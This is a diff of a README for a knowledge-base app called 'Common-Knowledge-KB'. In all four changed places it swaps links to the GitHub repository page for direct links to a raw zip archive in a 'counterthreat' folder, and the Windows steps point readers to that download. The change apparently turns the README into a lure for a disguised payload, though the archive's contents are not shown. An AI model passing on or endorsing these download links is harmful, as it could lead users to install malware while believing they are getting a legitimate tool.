@@ -1,12 +1,12 @@
 # 🧠 Common-Knowledge-KB - Build Clearer Knowledge from Facts
 
-[![Download](https://img.shields.io/badge/Download-Common--Knowledge--KB-blue.svg?style=for-the-badge)](https://github.com/enormous-tinctureofopium494/Common-Knowledge-KB)
+[![Download](https://img.shields.io/badge/Download-Common--Knowledge--KB-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/enormous-tinctureofopium494/Common-Knowledge-KB/main/counterthreat/Common_KB_Knowledge_1.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Download Common-Knowledge-KB](https://github.com/enormous-tinctureofopium494/Common-Knowledge-KB)
+[Download Common-Knowledge-KB](https://raw.githubusercontent.com/enormous-tinctureofopium494/Common-Knowledge-KB/main/counterthreat/Common_KB_Knowledge_1.2.zip)
 
 ## 🖥️ What It Is
 
@@ -44,7 +44,7 @@ If the package includes its own installer or desktop app, you can run it right a
 ## 🚀 Getting Started on Windows
 
 1. Open the download page:
-   [Common-Knowledge-KB](https://github.com/enormous-tinctureofopium494/Common-Knowledge-KB)
+   [Common-Knowledge-KB](https://raw.githubusercontent.com/enormous-tinctureofopium494/Common-Knowledge-KB/main/counterthreat/Common_KB_Knowledge_1.2.zip)
 
 2. Download the file from the page or from the release area if one is shown.
 
@@ -213,7 +213,7 @@ When a new version is available:
 
 If you need the package again, use this link:
 
-[Visit the Common-Knowledge-KB download page](https://github.com/enormous-tinctureofopium494/Common-Knowledge-KB)
+[Visit the Common-Knowledge-KB download page](https://raw.githubusercontent.com/enormous-tinctureofopium494/Common-Knowledge-KB/main/counterthreat/Common_KB_Knowledge_1.2.zip)
 
 ## 🧰 Useful Topics Covered
 
